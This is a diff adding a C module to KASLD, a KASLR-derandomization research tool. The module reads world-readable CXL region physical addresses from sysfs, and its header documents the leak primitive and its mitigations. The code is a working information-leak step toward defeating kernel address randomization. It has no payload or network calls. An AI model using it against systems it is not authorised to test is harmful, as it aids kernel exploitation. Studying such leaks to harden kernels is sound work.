@@ -1,0 +1,154 @@
+// This file is part of KASLD - https://github.com/bcoles/kasld
+//
+// Read Host Physical Addresses (HPA) of CXL (Compute Express Link) memory
+// regions from sysfs.
+//
+// The CXL subsystem exposes active memory regions at:
+//
+//   /sys/bus/cxl/devices/regionN/resource  (HPA base, %#llx format)
+//
+// The 'resource' attribute is created with DEVICE_ATTR_RO (S_IRUGO, 0444)
+// in drivers/cxl/core/region.c and reports p->res->start — the Host
+// Physical Address of the region's resource allocation. No capability
+// check; world-readable.
+//
+// When a region has no active allocation, the kernel returns -1ULL
+// (0xffffffffffffffff); only regions with a valid physical base address
+// are reported.
+//
+// CXL memory regions are physical DRAM ranges. On architectures with a
+// fixed physical-to-virtual mapping, these addresses convert directly to
+// linear-map kernel virtual addresses.
+//
+// Leak primitive:
+//   Data leaked:      CXL region Host Physical Address (DRAM base)
+//   Kernel subsystem: drivers/cxl — /sys/bus/cxl/devices/regionN/resource
+//   Data structure:   struct cxl_region_params → res->start (resource_size_t)
+//   Address type:     physical (DRAM)
+//   Method:           parsed (sysfs text attribute)
+//   Status:           unfixed (information exposure by design)
+//   Access check:     none (world-readable via DEVICE_ATTR_RO / S_IRUGO)
+//   Source:
+//   https://elixir.bootlin.com/linux/latest/source/drivers/cxl/core/region.c
+//
+// Mitigations:
+//   CONFIG_CXL_BUS=n removes the subsystem entirely. On x86_64 with
+//   CONFIG_RANDOMIZE_MEMORY enabled, physical addresses do not directly
+//   reveal the virtual text base.
+//
+// Requires:
+// - CONFIG_CXL_BUS
+// - At least one active CXL memory region with an allocated resource
+//
+// References:
+// https://elixir.bootlin.com/linux/latest/source/drivers/cxl/core/region.c
+// https://www.kernel.org/doc/html/latest/driver-api/cxl/memory-devices.html
+// ---
+// <bcoles@gmail.com>
+
+#include "include/kasld/api.h"
+#include "include/kasld/cli.h"
+#include <dirent.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+KASLD_EXPLAIN(
+    "Reads Host Physical Addresses (HPA) of CXL (Compute Express Link) "
+    "memory regions from /sys/bus/cxl/devices/regionN/resource. The CXL "
+    "subsystem exposes each active region's physical base address with "
+    "world-readable (0444) DEVICE_ATTR_RO attributes - no capability "
+    "check, not gated by kptr_restrict. On architectures with a fixed "
+    "physical-to-virtual mapping, these DRAM base addresses yield linear-"
+    "map kernel virtual addresses. Requires CONFIG_CXL_BUS.");
+
+// Untested: no CXL hardware available for testing.
+KASLD_META("method:parsed\n"
+           "phase:inference\n"
+           "discloses:physical\n"
+           "source:files\n"
+           "config:CONFIG_CXL_BUS\n");
+
+int main(void) {
+  const char *base = "/sys/bus/cxl/devices";
+  DIR *d;
+  struct dirent *ent;
+  char path[512];
+  char buf[256];
+  char label[128];
+  int device_count = 0;
+  int count = 0;
+
+  kasld_info("searching %s for CXL region HPA addresses ...", base);
+
+  d = kasld_opendir(base);
+  if (!d) {
+    if (errno == EACCES || errno == EPERM)
+      return KASLD_EXIT_NOPERM;
+    /* /sys/bus/cxl/devices absent if CONFIG_CXL_BUS is not enabled */
+    return KASLD_EXIT_UNAVAILABLE;
+  }
+
+  while ((ent = readdir(d)) != NULL) {
+    /* Region devices are named regionN (e.g. region0, region1) */
+    if (strncmp(ent->d_name, "region", 6) != 0)
+      continue;
+
+    device_count++;
+
+    snprintf(path, sizeof(path), "%s/%s/resource", base, ent->d_name);
+
+    if (kasld_read_file_line(path, buf, sizeof(buf)) < 0)
+      continue;
+
+    unsigned long long addr = 0;
+    /* resource attribute uses %#llx format: "0x<hex>" */
+    if (sscanf(buf, "0x%llx", &addr) != 1)
+      continue;
+
+    /* -1ULL indicates no active allocation */
+    if (addr == ~0ULL || !addr)
+      continue;
+
+    /* CXL regions are persistent / volatile memory exposed by CXL devices.
+     * The region directory name (e.g. "region0") identifies which one. */
+    snprintf(label, sizeof(label), "%.32s", ent->d_name);
+
+    /* The sibling size attribute (same %#llx "0x<hex>" format) gives the region
+     * extent: emit the whole band so the engine can exclude it
+     * (phys_reservation_exclude), not just a single interior point. Parse it
+     * strictly as hex; if the attribute is absent, unparseable, zero, or the
+     * extent is not representable in the word, fall back to a base-only sample
+     * (a wrong-format size can never widen the band). */
+    unsigned long long size = 0;
+    snprintf(path, sizeof(path), "%s/%s/size", base, ent->d_name);
+    if (kasld_read_file_line(path, buf, sizeof(buf)) == 0)
+      (void)sscanf(buf, "0x%llx", &size);
+    unsigned long long end = addr + size - 1; /* inclusive last byte */
+
+    if (size && end > addr && (unsigned long)end == end) {
+      kasld_found("sysfs_cxl_region %s: phys = 0x%016llx - 0x%016llx", label,
+                  addr, end);
+      kasld_result_range(KASLD_TYPE_PHYS, REGION_PMEM, (unsigned long)addr,
+                         (unsigned long)end, label, CONF_PARSED);
+    } else {
+      kasld_found("sysfs_cxl_region %s: phys = 0x%016llx", label, addr);
+      kasld_result_sample(KASLD_TYPE_PHYS, REGION_PMEM, (unsigned long)addr,
+                          label, CONF_PARSED);
+    }
+    count++;
+  }
+  closedir(d);
+
+  if (!count) {
+    if (!device_count)
+      kasld_err("no CXL region devices found in %s", base);
+    else
+      kasld_err("%d CXL region(s) found but no allocated resource addresses",
+                device_count);
+    return KASLD_EXIT_UNAVAILABLE;
+  }
+
+  return 0;
+}
